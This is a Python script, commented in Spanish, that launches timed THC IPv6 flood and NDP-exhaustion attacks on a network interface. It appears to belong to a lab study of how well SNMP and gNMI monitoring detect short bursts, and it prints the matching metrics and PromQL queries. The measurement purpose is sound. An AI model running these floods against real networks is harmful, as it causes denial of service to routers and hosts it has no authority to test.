#!/usr/bin/env python3
"""
flood_attack_test.py
====================
Script generalizado para ejecutar ataques THC IPv6 con duración configurable,
orientado al análisis comparativo de detección de ráfagas en SNMP vs gNMI.

Ataques soportados:
    advertise   → atk6-flood_advertise6  <iface>
                  ICMPv6 Neighbor Advertisement masivos (multicast ff02::1)
                  Métricas: ifHCInMulticastPkts, ifInErrors, ifInDiscards

    solicitate  → atk6-flood_solicitate6 <iface> <target>
                  ICMPv6 Neighbor Solicitation masivos hacia un grupo multicast
                  Ejemplo target: ff02::2 (all-routers)
                  Métricas: ifHCInMulticastPkts, ifInErrors, ifInDiscards

    ndpexhaust  → atk6-ndpexhaust26      <iface> <prefix>
                  Agotamiento de tabla NDP generando entradas con IPs aleatorias
                  Ejemplo prefix: 2001:db8:20::/64
                  Métricas: ifHCInUcastPkts, ifHCInMulticastPkts, ifInDiscards

Uso:
    sudo python3 flood_attack_test.py --attack advertise
    sudo python3 flood_attack_test.py --attack solicitate --target ff02::2
    sudo python3 flood_attack_test.py --attack ndpexhaust --target 2001:db8:20::/64
    sudo python3 flood_attack_test.py --attack advertise --duration 30 --repeat 4 --pause 30
    sudo python3 flood_attack_test.py --attack solicitate --iface eth0 --target ff02::2 --duration 10

Duraciones recomendadas para el estudio (--duration):
    2s  → DEFAULT — menor que 1 scrape, prueba de punto ciego
    5s  → 1 scrape — detección marginal con rate()[1m]
    10s → 2 scrapes — detectable, diferencia rate/irate notable
    30s → 6 scrapes — forma triangular vs rectangular clara
    60s → 12 scrapes — pico completo visible en rate()[1m]

Requiere:
    - THC IPv6: sudo apt-get install thc-ipv6
    - Permisos root (sudo)
"""

import subprocess
import signal
import sys
import time
import os
import argparse
from datetime import datetime, timezone


# ══════════════════════════════════════════════════════════════════════════════
# CONFIGURACIÓN POR DEFECTO
# ══════════════════════════════════════════════════════════════════════════════

DEFAULT_IFACE    = "eth1"
DEFAULT_DURATION = 2        # segundos — menor que 1 scrape: prueba de punto ciego
DEFAULT_REPEAT   = 1
DEFAULT_PAUSE    = 15       # segundos entre repeticiones
DEFAULT_SCRAPE   = 5        # scrape_interval / sample_interval del entorno


# ══════════════════════════════════════════════════════════════════════════════
# CATÁLOGO DE ATAQUES
# Cada entrada define: comando, si requiere target, descripción y métricas SNMP/gNMI
# ══════════════════════════════════════════════════════════════════════════════

ATTACK_CATALOG = {
    "advertise": {
        "cmd":          "atk6-flood_advertise6",
        "args":         ["{iface}"],                      # solo iface
        "requires_target": False,
        "description":  "ICMPv6 Neighbor Advertisement masivos con MACs/IPs aleatorias",
        "traffic_type": "MULTICAST — destino ff02::1 y solicited-node",
        "snmp_metrics": [
            ("ifHCInMulticastPkts", "contador principal del flooding"),
            ("ifInErrors",          "paquetes malformados rechazados"),
            ("ifInDiscards",        "overflow de buffer de recepción"),
        ],
        "gnmi_metrics": [
            ("in-multicast-packets",  "equivalente a ifHCInMulticastPkts"),
            ("in-error-packets",      "equivalente a ifInErrors"),
            ("in-discarded-packets",  "equivalente a ifInDiscards"),
        ],
        "promql_rate": [
            "rate(ifHCInMulticastPkts{{ifDescr='{iface}'}}[1m])",
            "rate(in_multicast_packets{{interface='{iface}'}}[1m])",
        ],
        "promql_irate": [
            "irate(ifHCInMulticastPkts{{ifDescr='{iface}'}}[1m])",
            "irate(ifInDiscards{{ifDescr='{iface}'}}[1m])        ← confirma overflow",
            "irate(in_multicast_packets{{interface='{iface}'}}[1m])",
            "irate(in_discarded_packets{{interface='{iface}'}}[1m])",
        ],
        "signature": "pico multicast + incremento discards = flooding activo",
    },

    "solicitate": {
        "cmd":          "atk6-flood_solicitate6",
        "args":         ["{iface}", "{target}"],           # iface + target multicast
        "requires_target": True,
        "target_hint":  "grupo multicast destino (ej: ff02::2 para all-routers)",
        "description":  "ICMPv6 Neighbor Solicitation masivos hacia grupo multicast",
        "traffic_type": "MULTICAST — solicitudes NS hacia el target especificado",
        "snmp_metrics": [
            ("ifHCInMulticastPkts", "NS masivos entrantes"),
            ("ifInErrors",          "NS malformados"),
            ("ifInDiscards",        "overflow por volumen de NS"),
        ],
        "gnmi_metrics": [
            ("in-multicast-packets",  "equivalente a ifHCInMulticastPkts"),
            ("in-error-packets",      "equivalente a ifInErrors"),
            ("in-discarded-packets",  "equivalente a ifInDiscards"),
        ],
        "promql_rate": [
            "rate(ifHCInMulticastPkts{{ifDescr='{iface}'}}[1m])",
            "rate(in_multicast_packets{{interface='{iface}'}}[1m])",
        ],
        "promql_irate": [
            "irate(ifHCInMulticastPkts{{ifDescr='{iface}'}}[1m])",
            "irate(ifInDiscards{{ifDescr='{iface}'}}[1m])",
            "irate(in_multicast_packets{{interface='{iface}'}}[1m])",
            "irate(in_discarded_packets{{interface='{iface}'}}[1m])",
        ],
        "signature": "pico multicast hacia ff02::2 + discards = flood NS a routers",
    },

    "ndpexhaust": {
        "cmd":          "atk6-ndpexhaust26",
        "args":         ["{iface}", "{target}"],           # iface + prefijo IPv6
        "requires_target": True,
        "target_hint":  "prefijo IPv6 a agotar (ej: 2001:db8:20::/64)",
        "description":  "Agotamiento de tabla NDP generando entradas aleatorias en el prefijo",
        "traffic_type": "MIXTO — unicast (solicitudes) + multicast (NS para cada IP)",
        "snmp_metrics": [
            ("ifHCInUcastPkts",     "respuestas NA unicast hacia el atacante"),
            ("ifHCInMulticastPkts", "NS multicast generados por el dispositivo"),
            ("ifInDiscards",        "descarte cuando la tabla NDP se satura"),
            ("ifOutUcastPkts",      "NS salientes del dispositivo hacia el prefijo"),
        ],
        "gnmi_metrics": [
            ("in-unicast-packets",    "equivalente a ifHCInUcastPkts"),
            ("in-multicast-packets",  "equivalente a ifHCInMulticastPkts"),
            ("in-discarded-packets",  "equivalente a ifInDiscards"),
            ("out-unicast-packets",   "equivalente a ifOutUcastPkts"),
        ],
        "promql_rate": [
            "rate(ifHCInUcastPkts{{ifDescr='{iface}'}}[1m])",
            "rate(ifHCInMulticastPkts{{ifDescr='{iface}'}}[1m])",
            "rate(ifOutUcastPkts{{ifDescr='{iface}'}}[1m])      ← NS salientes",
            "rate(in_unicast_packets{{interface='{iface}'}}[1m])",
            "rate(out_unicast_packets{{interface='{iface}'}}[1m])",
        ],
        "promql_irate": [
            "irate(ifHCInUcastPkts{{ifDescr='{iface}'}}[1m])",
            "irate(ifInDiscards{{ifDescr='{iface}'}}[1m])       ← tabla NDP llena",
            "irate(in_unicast_packets{{interface='{iface}'}}[1m])",
            "irate(in_discarded_packets{{interface='{iface}'}}[1m])",
        ],
        "signature": "aumento ifOutUcastPkts (NS salientes) + ifInDiscards = tabla NDP saturada",
    },
}


# ══════════════════════════════════════════════════════════════════════════════
# UTILIDADES
# ══════════════════════════════════════════════════════════════════════════════

def timestamp_utc() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S.%f")[:-3] + " UTC"


def check_requirements(attack_key: str, iface: str, target: str):
    """Verifica permisos, comando THC, interfaz y target si aplica."""
    attack  = ATTACK_CATALOG[attack_key]
    cmd     = attack["cmd"]
    errors  = []

    if os.geteuid() != 0:
        errors.append("Se requieren permisos root: sudo python3 flood_attack_test.py")

    result = subprocess.run(["which", cmd], capture_output=True, text=True)
    if result.returncode != 0:
        errors.append(
            f"{cmd} no encontrado.\n"
            "        Instalar con: sudo apt-get install thc-ipv6"
        )

    result = subprocess.run(["ip", "link", "show", iface], capture_output=True, text=True)
    if result.returncode != 0:
        errors.append(
            f"Interfaz '{iface}' no encontrada. "
            "Use 'ip link show' para listar las disponibles."
        )

    if attack["requires_target"] and not target:
        errors.append(
            f"El ataque '{attack_key}' requiere --target.\n"
            f"        Ejemplo: --target {attack['target_hint']}"
        )

    if errors:
        print("\n[ERROR] Verificación fallida:")
        for e in errors:
            print(f"  • {e}")
        sys.exit(1)

    print(f"  [OK] Permisos root")
    print(f"  [OK] {cmd} disponible")
    print(f"  [OK] Interfaz {iface}")
    if attack["requires_target"]:
        print(f"  [OK] Target: {target}")


def build_command(attack_key: str, iface: str, target: str) -> list:
    """Construye la lista de argumentos del comando THC."""
    attack = ATTACK_CATALOG[attack_key]
    cmd    = [attack["cmd"]]
    for arg in attack["args"]:
        cmd.append(arg.format(iface=iface, target=target))
    return cmd


def print_attack_info(attack_key: str, iface: str, target: str):
    """Muestra la ficha técnica del ataque seleccionado."""
    a = ATTACK_CATALOG[attack_key]
    cmd_str = " ".join(build_command(attack_key, iface, target or "<target>"))

    print(f"\n{'─'*62}")
    print(f"  Ataque seleccionado: {attack_key.upper()}")
    print(f"{'─'*62}")
    print(f"  Comando    : {cmd_str}")
    print(f"  Descripción: {a['description']}")
    print(f"  Tráfico    : {a['traffic_type']}")
    print(f"\n  Métricas SNMP relevantes:")
    for metric, desc in a["snmp_metrics"]:
        print(f"    {metric:<28} ← {desc}")
    print(f"\n  Métricas gNMI equivalentes:")
    for metric, desc in a["gnmi_metrics"]:
        print(f"    {metric:<28} ← {desc}")
    print(f"\n  Firma del ataque:")
    print(f"    {a['signature']}")
    print(f"{'─'*62}")


def print_study_context(duration: int, repeat: int, iface: str,
                        attack_key: str, scrape_interval: int):
    """Muestra el análisis de detectabilidad esperada."""
    ratio = duration / scrape_interval
    print(f"\n{'─'*62}")
    print(f"  Contexto del experimento")
    print(f"{'─'*62}")
    print(f"  Duración              : {duration}s")
    print(f"  Repeticiones          : {repeat}")
    print(f"  scrape_interval (SNMP): {scrape_interval}s")
    print(f"  sample_interval (gNMI): {scrape_interval}s")
    print(f"  Muestras por ataque   : {ratio:.1f} scrapes/samples")

    print(f"\n  Detectabilidad esperada:")
    if ratio < 0.5:
        snmp_rate = "MUY BAJA  — < 0.5 scrapes, muy probable punto ciego"
        snmp_irate = "BAJA     — capturable solo si scrape coincide (~25%)"
        gnmi_sample = "BAJA    — mismo efecto con rate()/irate()[1m]"
        gnmi_change = "ALTA    — on_change detecta en el instante"
    elif ratio < 1:
        snmp_rate = "BAJA      — < 1 scrape, probable punto ciego"
        snmp_irate = "MEDIA    — capturable si scrape coincide (~50%)"
        gnmi_sample = "MEDIA   — irate mejor que rate por timestamp hw"
        gnmi_change = "ALTA    — on_change detecta en el instante"
    elif ratio < 2:
        snmp_rate = "MEDIA     — pico diluido en ventana 60s"
        snmp_irate = "ALTA     — visible en 1-2 muestras"
        gnmi_sample = "ALTA    — plateau estable, flancos precisos"
        gnmi_change = "ALTA    — máxima precisión"
    elif ratio < 6:
        snmp_rate = "MEDIA-ALTA — forma triangular, pico subestimado"
        snmp_irate = "ALTA      — forma más rectangular"
        gnmi_sample = "ALTA    — representación precisa"
        gnmi_change = "ALTA    — máxima precisión"
    else:
        snmp_rate = "ALTA      — visible, suavizado triangular"
        snmp_irate = "ALTA     — forma rectangular, pico real"
        gnmi_sample = "ALTA    — representación rectangular"
        gnmi_change = "ALTA    — máxima precisión"

    print(f"  [SNMP  rate()[1m]]  {snmp_rate}")
    print(f"  [SNMP  irate()[1m]] {snmp_irate}")
    print(f"  [gNMI  sample]      {gnmi_sample}")
    print(f"  [gNMI  on_change]   {gnmi_change}")
    print(f"{'─'*62}")


# ══════════════════════════════════════════════════════════════════════════════
# EJECUCIÓN DEL ATAQUE
# ══════════════════════════════════════════════════════════════════════════════

def run_attack(cmd: list, attack_key: str, iface: str,
               duration: int, run_number: int, total_runs: int) -> dict:
    """
    Ejecuta el comando THC durante `duration` segundos.
    Retorna dict con metadatos para correlación con Grafana.
    """
    cmd_str = " ".join(cmd)

    print(f"\n{'═'*62}")
    print(f"  Ataque {run_number}/{total_runs} — {attack_key.upper()}")
    print(f"  Comando  : {cmd_str}")
    print(f"  Duración : {duration}s")
    print(f"  Inicio   : {timestamp_utc()}")
    print(f"{'═'*62}")
    print(f"  [*] Ejecutando... (Ctrl+C para interrumpir)\n")

    process  = None
    t_start  = time.time()
    ts_start = timestamp_utc()

    try:
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            preexec_fn=os.setsid,
        )

        for elapsed in range(duration):
            remaining = duration - elapsed
            bar       = "█" * int((elapsed / duration) * 30)
            print(f"\r  [{bar:<30}] {remaining:3d}s  PID={process.pid}",
                  end="", flush=True)
            time.sleep(1)
            if process.poll() is not None:
                print(f"\n  [!] Proceso terminó antes (código: {process.returncode})")
                break

        print(f"\r  [{'█'*30}] Completado.                    ")

    except KeyboardInterrupt:
        print(f"\n  [!] Interrumpido por el usuario")

    finally:
        if process and process.poll() is None:
            try:
                os.killpg(os.getpgid(process.pid), signal.SIGTERM)
                time.sleep(0.5)
                if process.poll() is None:
                    os.killpg(os.getpgid(process.pid), signal.SIGKILL)
            except (ProcessLookupError, OSError):
                pass

    t_end    = time.time()
    ts_end   = timestamp_utc()
    real_dur = round(t_end - t_start, 2)

    print(f"\n  Fin      : {ts_end}")
    print(f"  Duración real: {real_dur}s (cfg: {duration}s)")

    return {
        "run":           run_number,
        "attack":        attack_key,
        "cmd":           cmd_str,
        "iface":         iface,
        "duration_cfg":  duration,
        "duration_real": real_dur,
        "ts_start":      ts_start,
        "ts_end":        ts_end,
        "t_start_unix":  round(t_start, 3),
        "t_end_unix":    round(t_end, 3),
    }


# ══════════════════════════════════════════════════════════════════════════════
# INFORME FINAL
# ══════════════════════════════════════════════════════════════════════════════

def print_report(runs: list, attack_key: str, iface: str):
    """Imprime resumen con timestamps y PromQL para Grafana."""
    a = ATTACK_CATALOG[attack_key]

    print(f"\n{'═'*62}")
    print(f"  RESUMEN — {attack_key.upper()} · {len(runs)} ataque(s)")
    print(f"{'═'*62}\n")

    for r in runs:
        print(f"  Ataque {r['run']}:")
        print(f"    Comando  : {r['cmd']}")
        print(f"    Inicio   : {r['ts_start']}")
        print(f"    Fin      : {r['ts_end']}")
        print(f"    Duración : {r['duration_real']}s (cfg: {r['duration_cfg']}s)")
        print(f"    Unix     : {r['t_start_unix']} → {r['t_end_unix']}")
        print()

    # PromQL específico del ataque
    print(f"{'─'*62}")
    print(f"  PromQL para Grafana — ataque {attack_key.upper()}")
    print(f"{'─'*62}")

    print(f"\n  Con rate()[1m] (tráfico sostenido / ataques ≥ 10s):")
    for q in a["promql_rate"]:
        print(f"    {q.format(iface=iface)}")

    print(f"\n  Con irate()[1m] (ráfagas cortas / SNR alto):")
    for q in a["promql_irate"]:
        print(f"    {q.format(iface=iface)}")

    print(f"\n  Firma del ataque a correlacionar:")
    print(f"    {a['signature']}")

    print(f"\n  Trade-off rate() vs irate() para este ataque:")
    print(f"    rate()  → mejor si el fondo multicast tiene ruido (ND/RA continuo)")
    print(f"    irate() → mejor para ifInDiscards e ifInErrors (ruido de fondo ~0)")
    print(f"    Recomendación: usar AMBOS operadores en paneles separados de Grafana")
    print(f"{'═'*62}\n")


# ══════════════════════════════════════════════════════════════════════════════
# CLI
# ══════════════════════════════════════════════════════════════════════════════

def parse_args():
    attack_list = ", ".join(ATTACK_CATALOG.keys())
    p = argparse.ArgumentParser(
        description="Ataques THC IPv6 generalizados para estudio SNMP vs gNMI",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    p.add_argument(
        "--attack",
        choices=list(ATTACK_CATALOG.keys()),
        default="advertise",
        help=f"Tipo de ataque: {attack_list} (default: advertise)",
    )
    p.add_argument("--iface",    default=DEFAULT_IFACE,
                   help=f"Interfaz de red (default: {DEFAULT_IFACE})")
    p.add_argument("--target",   default="",
                   help="IP/prefijo/grupo destino según el ataque "
                        "(requerido para solicitate y ndpexhaust)")
    p.add_argument(
        "--duration",
        type=int,
        default=DEFAULT_DURATION,
        choices=[2, 5, 10, 30, 60],
        help="Duración en segundos: 2 (default) | 5 | 10 | 30 | 60",
    )
    p.add_argument("--repeat",   type=int, default=DEFAULT_REPEAT,
                   help=f"Repeticiones (default: {DEFAULT_REPEAT})")
    p.add_argument("--pause",    type=int, default=DEFAULT_PAUSE,
                   help=f"Pausa entre ataques en segundos (default: {DEFAULT_PAUSE})")
    p.add_argument("--scrape-interval", type=int, default=DEFAULT_SCRAPE,
                   help=f"scrape_interval/sample_interval (default: {DEFAULT_SCRAPE})")
    p.add_argument("--list-attacks", action="store_true",
                   help="Mostrar catálogo de ataques disponibles y salir")
    return p.parse_args()


def list_attacks():
    """Muestra el catálogo completo de ataques."""
    print(f"\n{'═'*62}")
    print(f"  Catálogo de ataques THC IPv6 disponibles")
    print(f"{'═'*62}")
    for key, a in ATTACK_CATALOG.items():
        req = f"--target {a['target_hint']}" if a["requires_target"] else "(sin target)"
        print(f"\n  {key.upper()}")
        print(f"    Comando    : {a['cmd']}")
        print(f"    Target     : {req}")
        print(f"    Descripción: {a['description']}")
        print(f"    Tráfico    : {a['traffic_type']}")
    print(f"\n{'═'*62}\n")


def main():
    args = parse_args()

    if args.list_attacks:
        list_attacks()
        sys.exit(0)

    print(f"\n{'═'*62}")
    print(f"  flood_attack_test.py — Estudio comparativo SNMP vs gNMI")
    print(f"{'═'*62}")

    # Verificar entorno
    print(f"\n  Verificando requisitos...")
    check_requirements(args.attack, args.iface, args.target)

    # Ficha técnica del ataque
    print_attack_info(args.attack, args.iface, args.target)

    # Contexto del estudio
    print_study_context(
        duration        = args.duration,
        repeat          = args.repeat,
        iface           = args.iface,
        attack_key      = args.attack,
        scrape_interval = args.scrape_interval,
    )

    # Construir comando
    cmd = build_command(args.attack, args.iface, args.target)

    # Confirmación
    print(f"\n  Se ejecutarán {args.repeat} ataque(s) de {args.duration}s.")
    print(f"  Comando: {' '.join(cmd)}")
    confirm = input("  ¿Continuar? [s/N]: ").strip().lower()
    if confirm not in ("s", "si", "sí", "y", "yes"):
        print("  Cancelado.")
        sys.exit(0)

    # Ejecutar
    runs = []
    for i in range(1, args.repeat + 1):
        result = run_attack(
            cmd        = cmd,
            attack_key = args.attack,
            iface      = args.iface,
            duration   = args.duration,
            run_number = i,
            total_runs = args.repeat,
        )
        runs.append(result)

        if i < args.repeat:
            print(f"\n  Pausa de {args.pause}s...")
            for remaining in range(args.pause, 0, -1):
                print(f"\r  Próximo ataque en {remaining:3d}s...",
                      end="", flush=True)
                time.sleep(1)
            print()

    # Informe
    print_report(runs, args.attack, args.iface)


if __name__ == "__main__":
    main()
